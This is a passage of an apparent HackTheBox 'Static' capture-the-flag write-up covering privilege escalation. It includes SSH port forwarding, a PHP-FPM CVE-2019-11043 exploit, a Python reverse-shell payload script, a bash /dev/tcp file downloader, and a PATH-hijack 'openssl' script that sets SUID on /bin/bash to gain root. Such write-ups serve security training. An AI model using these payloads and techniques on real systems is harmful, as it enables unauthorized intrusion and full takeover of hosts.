+www-data@web:/home$
+```
+
+## Privilege escalation
+
+If you see on the `Support` Portal we have another network of `ip(192.168.254.3)`.
+
+<FixTheImageURL src='web17.png' slug='hackthebox-static-writeup' />
+
+And if we see `inside` our ssh Connection we are in the same network on `eth1` interface.
+
+```js
+www-data@web:~$ ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
+        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
+        RX packets 100008  bytes 39649752 (39.6 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 86405  bytes 35634144 (35.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
+        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
+        RX packets 144944  bytes 36288353 (36.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 162422  bytes 27874740 (27.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 297  bytes 32771 (32.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 297  bytes 32771 (32.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+let's do port `forwarding` with ssh so we can access the `network`
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ ssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i id_rsa_www-data
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-16-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Wed Jun 23 12:21:14 2021 from 10.10.14.59
+```
+
+Now let's go to `localhost` or `127.0.0.1` and we got the page.
+
+There is `nothing` on the website just saying `batch mode: /usr/bin/ersatool...`
+
+<FixTheImageURL src='web18.png' slug='hackthebox-static-writeup' />
+
+And if we `check` the header we see `PHP-FPM/7.1` is running let's check the `exploit` for that.
+
+<FixTheImageURL src='web19.png' slug='hackthebox-static-writeup' />
+
+Link : https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc
+
+Link : https://github.com/theMiddleBlue/CVE-2019-11043
+
+After reading the `article` i understand that how to `exploit` this and get `rev` shell.
+
+## Step 1
+
+Git clone the `repo` and get the `exploit.py` file and delete the directory.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ git clone https://github.com/theMiddleBlue/CVE-2019-11043.git
+Cloning into 'CVE-2019-11043'...
+remote: Enumerating objects: 49, done.
+remote: Counting objects: 100% (49/49), done.
+remote: Compressing objects: 100% (30/30), done.
+remote: Total 49 (delta 24), reused 40 (delta 15), pack-reused 0
+Receiving objects: 100% (49/49), 7.85 KiB | 7.85 MiB/s, done.
+Resolving deltas: 100% (24/24), done.
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ mv CVE-2019-11043/exploit.py .
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ rm -rf CVE-2019-11043/
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ ls -al
+total 12
+drwxr-xr-x 1 root   root     38 Jun 23 07:35 .
+drwxr-xr-x 1 root   root     54 Jun 23 07:32 ..
+-rw-r--r-- 1 dedsec dedsec  428 Jun 23 07:34 dedsec.py
+-rw-r--r-- 1 root   root   4280 Jun 23 07:35 exploit.py
+```
+
+## Step 2
+
+I `create` simple script to make things `easy`.
+
+### dedsec.py
+
+```js
+import requests
+
+payload = '/usr/bin/python3.6 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
+
+r = requests.get("http://192.168.254.3/index.php?a="+payload)
+print(r.text)
+```
+
+## Step 3
+
+Download the `nc` binary.
+
+Link : https://github.com/H74N/netcat-binaries/blob/master/nc
+
+## Step 4
+
+Put all `3` files in one `folder` and transfer them with `scp`.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ ls -al
+total 780
+drwxr-xr-x 1 root   root       72 Jun 23 07:49 .
+drwxr-xr-x 1 root   root       54 Jun 23 07:32 ..
+-rw-r--r-- 1 dedsec dedsec    347 Jun 23 07:42 dedsec.py
+-rw-r--r-- 1 root   root     4280 Jun 23 07:35 exploit.py
+-rw------- 1 root   root     1675 Jun 23 07:43 id_rsa_www-data
+-rw-r--r-- 1 root   root   779832 Jun 23 07:49 nc
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ scp -P 2222 -i id_rsa_www-data nc www-data@10.10.10.246:/tmp/nc
+nc                                                                                                                                                          100%  762KB 859.3KB/s   00:00
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ scp -P 2222 -i id_rsa_www-data exploit.py www-data@10.10.10.246:/tmp/exploit.py
+exploit.py                                                                                                                                                  100% 4280    49.7KB/s   00:00
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$ scp -P 2222 -i id_rsa_www-data dedsec.py www-data@10.10.10.246:/tmp/dedsec.py
+dedsec.py                                                                                                                                                   100%  347     4.1KB/s   00:00
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static/www/CVE-2019-11043]
+└──╼ [★]$
+```
+
+Now open `2` ssh `Connections` and start `netcat` listner on `9001` in one of the `ssh` connection.
+
+<FixTheImageURL src='cmd5.png' slug='hackthebox-static-writeup' />
+
+After start the `netcat` listner run the `exploit.py`
+
+```js
+python3 exploit.py --url http://192.168.254.3/index.php
+```
+
+<FixTheImageURL src='cmd6.png' slug='hackthebox-static-writeup' />
+
+After running the `exploit` you got the url. we don't need to open that `url` because we create a `script` for that so they open that and add the `python3` exploit and we got the `rev` shell.
+
+We just need to run the `dedsec.py` for 2-3 times and we got the `shell`.
+
+```js
+python3 dedsec.py
+```
+
+<FixTheImageURL src='cmd7.png' slug='hackthebox-static-writeup' />
+
+Now if you `remember` we see a file called `ersatool` on web page. Let's `check` that file.
+
+<FixTheImageURL src='web20.png' slug='hackthebox-static-writeup' />
+
+After `checking` that file i known that it's a `binary` which running as `root`.
+
+```js
+www-data@pki:~/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@pki:~/html$ pwd
+pwd
+/var/www/html
+www-data@pki:~/html$ ls
+ls
+index.php  uploads
+www-data@pki:~/html$ ls -al  /usr/bin/ersatool
+ls -al  /usr/bin/ersatool
+-rwxr-xr-x 1 root root 22496 Jun 21 17:05 /usr/bin/ersatool
+www-data@pki:~/html$ file /usr/bin/ersatool
+file /usr/bin/ersatool
+/usr/bin/ersatool: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped
+```
+
+And after some `enumeration` i found the source `code` that file.
+
+```js
+www-data@pki:/usr/bin$ find / -name ersatool.* 2>/dev/null
+/usr/src/ersatool.c
+```
+
+source code of `ersatool` binary.
+
+<FixTheImageURL src='cmd8.png' slug='hackthebox-static-writeup' />
+
+## ersatool.c
+
+```js
+#include <stdio.h>
+#include &lt;stdlib.h>
+#include &lt;string.h>
+#include &lt;sys/types.h>
+#include &lt;unistd.h>
+#include &lt;sys/stat.h>
+#include &lt;fcntl.h>
+#include &lt;libgen.h>
+#include &lt;sys/wait.h>
+#include &lt;ctype.h>
+
+//easyrsa configuration
+char ERSA_DIR[]="/opt/easyrsa";
+char TA_KEY[]="/opt/easyrsa/clients/ta.key";
+char OUTPUT_DIR[]="/opt/easyrsa/clients";
+char BASE_CONFIG[]="/opt/easyrsa/clients/base.conf";
+char EXT[]=".ovpn";
+
+//void printCN(char*,int);
+void filePrint(char*);
+void revokeCN(char*,int);
+void createCN(char*,int);
+void integrateCN(char*);
+void getHelp(char*,int);
+void cleanStr(char*);
+
+//deprecated function - prints the CN ovpn config file
+//conf file can be printed with inegrateCN(); <- create
+void printCN(char *cn, int i){
+        char fn[100];
+        char buffer[100];
+
+        if(i==1){
+                printf("print->CN=");
+                fflush(stdout);
+                memset(buffer,0,sizeof(buffer));
+                read(0,buffer,sizeof(buffer));
+        }
+        else {
+                memset(buffer,0,sizeof(buffer));
+                strncat(buffer,cn,sizeof(buffer));
+        }
+
+        if(!strncmp("\n",buffer,1)) { return; }
+
+        do{
+                strncpy(fn, OUTPUT_DIR,sizeof(fn));
+                strncat(fn, "/",sizeof(fn)-strlen(fn));
+                strncat(fn, strtok(basename(buffer),"\n"),sizeof(fn)-strlen(fn));
+                strncat(fn, EXT, sizeof(fn)-strlen(fn));
+                printf(buffer); //checking buffer content
+                filePrint(fn);
+                if(i==1){
+
+                        printf("\nprint->CN=");
+                        fflush(stdout);
+                        memset(buffer,0,sizeof(buffer));
+                        read(0,buffer,sizeof(buffer));
+                }
+        } while (strncmp("\n",buffer,1) && i==1);
+}
+
+void filePrint(char *filename){
+        int bfsiz=1;
+        char buffer[bfsiz];
+        int fd;
+        ssize_t fr;
+        memset(buffer,0,bfsiz);
+        setuid(0); //escalating privileges to read root owned files
+        if((fd=open(filename,O_RDONLY))&lt;0){
+                printf("[!] ERR reading %s!\n",filename);
+        }
+        while(fr=read(fd,buffer,bfsiz)>0){
+                printf("%s",buffer);
+                memset(buffer,0,bfsiz);
+        }
+        close(fd);
+        fflush(stdout);
+}
+
+void revokeCN(char *cn, int i){
+        puts("[!] Not implemented");
+        fflush(stdout);
+}
+
+//creates and prints new CN config file
+void createCN(char *cn, int i){
+        int devNull, sout, serr, pid, status, oid;
+        char EASYRSA[50];
+        char buffer[100];
+        char CMD[100];
+        char WD[50];
+
+        memset(EASYRSA,0,sizeof(EASYRSA));
+        strcat(EASYRSA,ERSA_DIR);
+        strcat(EASYRSA,"/easyrsa");
+
+        if(i==1){
+                printf("create->CN=");
+                fflush(stdout);
+                memset(buffer,0,sizeof(buffer));
+                read(0,buffer,sizeof(buffer));
+        }
+        else {
+                memset(buffer,0,sizeof(buffer));
+                strncat(buffer, cn, sizeof(buffer));
+        }
+
+        if(!strncmp("\n",buffer,1)) { return; }
+
+        do{
+                pid = vfork();
+                if(pid==0){
+                        char *a[] = {EASYRSA,"build-client-full",strtok(basename(buffer),"\n"),"nopass","batch"};
+                        //forge the command string
+                        cleanStr(a[2]);
+                        sprintf(CMD,"%s %s %.20s %s %s",a[0],a[1],a[2],a[3],a[4]);
+                        sout=dup(STDOUT_FILENO);
+                        serr=dup(STDERR_FILENO);
+                        devNull=open("/dev/null",O_WRONLY);
+                        dup2(devNull,STDOUT_FILENO);
+                        dup2(devNull,STDERR_FILENO);
+                        setuid(0); //escalating privilges to generate required files
+                        chdir(ERSA_DIR);
+                        system(CMD);
+                        exit(0);
+                }
+                dup2(sout,STDOUT_FILENO);
+                dup2(serr,STDERR_FILENO);
+                close(devNull);
+                usleep(500000);
+                integrateCN(buffer);
+
+                if(i==1){
+                        printf("create->CN=");
+                        fflush(stdout);
+                        memset(buffer,0,sizeof(buffer));
+                        read(0,buffer,sizeof(buffer));
+                }
+        } while (strncmp("\n",buffer,1) && i==1);
+}
+
+//print valid ovpnfile for provided cn
+void integrateCN(char *cn){
+        char PKI_DIR[50];
+        char KEY_DIR[50];
+        char CRT_DIR[50];
+        char CA_CERT[50];
+        char CN_CERT[50];
+        char CN_KEY[50];
+
+        memset(PKI_DIR,0,sizeof(PKI_DIR));
+        memset(KEY_DIR,0,sizeof(KEY_DIR));
+        memset(CRT_DIR,0,sizeof(CRT_DIR));
+        memset(CA_CERT,0,sizeof(CA_CERT));
+        memset(CN_CERT,0,sizeof(CN_CERT));
+        memset(CN_KEY,0,sizeof(CN_KEY));
+
+        strcat(PKI_DIR,ERSA_DIR);
+        strcat(PKI_DIR,"/pki");
+        strcat(KEY_DIR,PKI_DIR);
+        strcat(KEY_DIR,"/private");
+        strcat(CRT_DIR,PKI_DIR);
+        strcat(CRT_DIR,"/issued");
+        strcat(CA_CERT,PKI_DIR);
+        strcat(CA_CERT,"/ca.crt");
+        strcat(CN_CERT,CRT_DIR);
+        strcat(CN_CERT,"/");
+        strcat(CN_CERT,basename(cn));
+        strcat(CN_CERT,".crt");
+        strcat(CN_KEY,KEY_DIR);
+        strcat(CN_KEY,"/");
+        strcat(CN_KEY,basename(cn));
+        strcat(CN_KEY,".key");
+
+        filePrint(BASE_CONFIG);
+
+        printf("&lt;ca>\n");
+        filePrint(CA_CERT);
+        printf("&lt;/ca>\n");
+
+        printf("&lt;cert>\n");
+        filePrint(CN_CERT);
+        printf("&lt;/cert>\n");
+
+        printf("&lt;key>\n");
+        filePrint(CN_KEY);
+        printf("&lt;/key>\n");
+
+        printf("key-direction 1\n&lt;tls-auth>\n");
+        filePrint(TA_KEY);
+        printf("&lt;/tls-auth>\n");
+        fflush(stdout);
+}
+
+void getHelp(char *prog, int i){
+        if(i==1) {
+                printf("create|print|revoke|exit\n");
+                fflush(stdout);
+        }
+        else{
+                printf("batch mode: %s create|print|revoke CN\n",prog);
+                fflush(stdout);
+                exit(255);
+        }
+}
+
+//clean non alphanum chars from string to secure
+void cleanStr(char *str)
+{
+    unsigned long i = 0;
+    unsigned long j = 0;
+    char c;
+
+    while ((c = str[i++]) != '\0')
+    {
+        if (isalnum(c))
+        {
+            str[j++] = c;
+        }
+    }
+    str[j] = '\0';
+}
+
+int main(int argc, char **argv){
+        int interactive=0;
+        char opt[8];
+        char *cn;
+
+        if(argc!=3 && argc!=1){
+                getHelp(argv[0],interactive);
+        }
+        else if(argc==1){
+                interactive=1;
+                printf("# ");
+                fflush(stdout);
+                memset(opt,0,sizeof(opt));
+                read(0,opt,sizeof(opt));
+                cn=NULL;
+        }
+        else {
+                strncpy(opt,argv[1],sizeof(opt));
+                cn=argv[2];
+        }
+
+        do      {
+                if(!strncmp("revoke",opt,6)){
+                        revokeCN(cn,interactive);
+                }
+                else if (!strncmp("print",opt,5)){
+                        printCN(cn,interactive);
+                }
+                else if (!strncmp("create",opt,6)){
+                        createCN(cn,interactive);
+                }
+                else if (!strncmp("exit",opt,4)){
+                        exit(0);
+                }
+                else{
+                        getHelp(argv[0], interactive);
+                }
+
+                if(interactive==1){
+                        memset(opt,0,sizeof(opt));
+                        printf("# ");
+                        fflush(stdout);
+                        memset(opt,0,sizeof(opt));
+                        read(0,opt,sizeof(opt));
+                }
+        } while(interactive==1);
+}
+```
+
+\*\*So we have two methods for geeting root
+
+1. using format string vulnerability
+2. path injection  
+   So i use path injection for doing that.\*\*
+
+So let's `monitor` the calls of binary with `pspy` but the problem is how do we `transfer` that pspy binary on that `machiene` because there is no `curl` and wget or `nothing` for that.
+
+But i found a way to `transfer` pspy into machiene by help of this `article`.
+
+Link : https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et
+
+With the `help` of this bash `script` i will transfer that `pspy` binary.
+
+```js
+function __curl() {
+  read proto server path &lt;&lt;&lt;$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3&lt;>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) &lt;&3
+  exec 3>&-
+}
+```
+
+## Step 1
+
+First `thing` first let's download the `pspy` binary.
+
+Link : https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+
+## Step 2
+
+Then `transfer` the pspy binary into `www-data` with scp.
+
+```js
+scp -P 2222 -i id_rsa_www-data ../../binary/pspy64s www-data@10.10.10.246:/tmp/pspy
+```
+
+### Step 3
+
+Start the `python3` server on the `/tmp` directory.
+
+```js
+cd /tmp
+python3 -m http.server 1337
+```
+
+<FixTheImageURL src='cmd9.png' slug='hackthebox-static-writeup' />
+
+## Step 4
+
+Follow the `steps` again to get the second shell with `dedsec.py` because we want two `shells` first is for running `pspy` second is for running ersatool `binary`.
+
+After `everything` ready go to the `shell` which we get from `dedsec.py` and paste the whole `script` on terminal.
+
+**1. go to /tmp directory  
+2. create a directory www  
+3. paste the whole code which we get from stackoverflow  
+4. then call the function with \_\_curl  
+5. and download the file inside /tmp/www directory**
+
+```js
+www-data@pki:/$ cd /tmp
+www-data@pki:/$ mkdir www
+www-data@pki:/$ cd /www
+www-data@pki:/tmp/www$ ls
+www-data@pki:/tmp/www$ function __curl() {
+>   read proto server path &lt;&lt;&lt;$(echo ${1//// })
+>   DOC=/${path// //}
+>   HOST=${server//:*}
+>   PORT=${server//*:}
+>   [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+>
+>   exec 3&lt;>/dev/tcp/${HOST}/$PORT
+>   echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+>   (while read line; do
+>    [[ "$line" == $'\r' ]] && break
+>   done && cat) &lt;&3
+>   exec 3>&-
+> }
+www-data@pki:/tmp/www$ __curl http://192.168.254.2:1337/pspy > pspy
+www-data@pki:/tmp/www$ ls -al
+total 1160
+drwxrwxrwt 1 root     root       24576 Jun 25 02:24 .
+drwxr-xr-x 1 root     root        4096 Jun 25 01:26 ..
+-rw-r--r-- 1 www-data www-data 1156536 Jun 25 02:24 pspy
+www-data@pki:/tmp/www$
+```
+
+<FixTheImageURL src='cmd10.png' slug='hackthebox-static-writeup' />
+
+Now after `transferring` pspy run that on first `rev` shell.
+
+```js
+www-data@pki:/tmp/www$ chmod +x pspy
+www-data@pki:/tmp/www$ ./pspy | tee log
+```
+
+Now on `second` rev shell run that `ersatool` binary.
+
+```js
+/usr/bin/ersatool
+create
+a
+print
+a
+b
+exit
+```
+
+And i `capture` all calls of the `binary` and i found that `openssl` was call without giving the `full` path.
+
+<FixTheImageURL src='cmd11.png' slug='hackthebox-static-writeup' />
+
+<FixTheImageURL src='cmd12.png' slug='hackthebox-static-writeup' />
+
+```js
+www-data@pki:/tmp/www$ chmod +x pspy
+www-data@pki:/tmp/www$ ./pspy
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2021/06/25 02:46:00 CMD: UID=0    PID=9      | nginx: master process nginx
+2021/06/25 02:46:00 CMD: UID=0    PID=7      | /bin/bash /entry.sh
+2021/06/25 02:46:00 CMD: UID=33   PID=542    | php-fpm: pool www
+2021/06/25 02:46:00 CMD: UID=33   PID=541    | php-fpm: pool www
+2021/06/25 02:46:00 CMD: UID=33   PID=540    | php-fpm: pool www
+2021/06/25 02:46:00 CMD: UID=33   PID=539    | php-fpm: pool www
+2021/06/25 02:46:00 CMD: UID=33   PID=538    | php-fpm: pool www
+2021/06/25 02:46:00 CMD: UID=33   PID=1950   | ./pspy
+2021/06/25 02:46:00 CMD: UID=33   PID=1935   | /bin/bash
+2021/06/25 02:46:00 CMD: UID=33   PID=1934   | python3 -c import pty; pty.spawn("/bin/bash")
+2021/06/25 02:46:00 CMD: UID=33   PID=1931   | /bin/bash
+2021/06/25 02:46:00 CMD: UID=33   PID=1930   | python3 -c import pty; pty.spawn("/bin/bash")
+2021/06/25 02:46:00 CMD: UID=33   PID=1927   | /bin/bash
+2021/06/25 02:46:00 CMD: UID=33   PID=1926   | //usr/bin/python3.6 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+2021/06/25 02:46:00 CMD: UID=33   PID=1925   | sh -c //usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+2021/06/25 02:46:00 CMD: UID=33   PID=1921   | /bin/bash
+2021/06/25 02:46:00 CMD: UID=33   PID=1920   | //usr/bin/python3.6 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+2021/06/25 02:46:00 CMD: UID=33   PID=1919   | sh -c //usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+2021/06/25 02:46:00 CMD: UID=0    PID=12     | php-fpm: master process (/usr/local/etc/php-fpm.conf)
+2021/06/25 02:46:00 CMD: UID=33   PID=11     | nginx: worker process
+2021/06/25 02:46:00 CMD: UID=33   PID=10     | nginx: worker process
+2021/06/25 02:46:00 CMD: UID=0    PID=1      | /bin/sh -c /entry.sh
+2021/06/25 02:46:03 CMD: UID=33   PID=1959   | /usr/bin/ersatool
+2021/06/25 02:46:35 CMD: UID=0    PID=1961   | sh -c /opt/easyrsa/easyrsa build-client-full a nopass batch
+2021/06/25 02:46:35 CMD: UID=0    PID=1960   | /usr/bin/ersatool
+2021/06/25 02:46:35 CMD: UID=0    PID=1962   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
+2021/06/25 02:46:35 CMD: UID=0    PID=1985   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
+2021/06/25 02:46:35 CMD: UID=0    PID=1987   | openssl ca -utf8 -in /opt/easyrsa/pki/reqs/a.req -out /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch
+2021/06/25 02:46:35 CMD: UID=0    PID=1988   | mv /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY /opt/easyrsa/pki/issued/a.crt
+```
+
+So we can use that for `Privilege` escalation using `path` injection
+
+Link : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+
+Now i create a file called `openssl` with the bash `content` inside in my local machiene.
+
+## openssl
+
+```js
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+Now `base64` encode this and copy the `base64` string.
+
+```js
+┌───[us-free-1]─[10.10.14.59]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ cat openssl | base64
+IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=
+```
+
+Create a `directory` inside `/tmp` folder called pwn
+
+```js
+www-data@pki:/tmp$ mkdir pwn
+www-data@pki:/tmp$ cd pwn
+www-data@pki:/tmp/pwn$
+```
+
+Now paste that `base64` encode string and `decode` it and save that output in a file called `openssl`
+
+```js
+www-data@pki:/tmp/pwn$ echo "IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=" | base64 -d > openssl
+www-data@pki:/tmp/pwn$ cat openssl
+#!/bin/bash
+chmod u+s /bin/bash
+www-data@pki:/tmp/pwn$
+```
+
+Now change the `permission` and set the path of `/tmp/pwn` directory.
+
+```js
+www-data@pki:/tmp/pwn$ echo "IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=" | base64 -d > openssl
+www-data@pki:/tmp/pwn$ cat openssl
+#!/bin/bash
+chmod u+s /bin/bash
+www-data@pki:/tmp/pwn$ chmod 755 openssl
+www-data@pki:/tmp/pwn$ ls -al
+total 12
+drwxr-xr-x 2 www-data www-data 4096 Jun 25 02:58 .
+drwxrwxrwt 1 root     root     4096 Jun 25 02:57 ..
+-rwxr-xr-x 1 www-data www-data   32 Jun 25 02:58 openssl
+www-data@pki:/tmp/pwn$ export PATH=/tmp/pwn:$PATH
+www-data@pki:/tmp/pwn$ echo $PATH
+/tmp/pwn:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@pki:/tmp/pwn$
+```
+
+Now just run the `ersatool` binary and check the `/bin/bash` binary as shown in the image.
+
+<FixTheImageURL src='cmd13.png' slug='hackthebox-static-writeup' />
+
+And we see that `/bin/bash` binary permission has been changed to `suid` bit set.
+
+<FixTheImageURL src='cmd14.png' slug='hackthebox-static-writeup' />
+
+Now just execute the `/bin/bash` -p and get the `root.txt` file.
+
+```js
+www-data@pki:/tmp/pwn$ ls -al /bin/bash
+-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+www-data@pki:/tmp/pwn$ /bin/bash -p
+bash-4.4# cd /root/
+bash-4.4# ls
+notes.txt  root.txt
+bash-4.4# cat root.txt
+0f5d512bf6ddb951699b1c05b6bb2cb1
+```
+
+<FixTheImageURL src='cmd15.png' slug='hackthebox-static-writeup' />
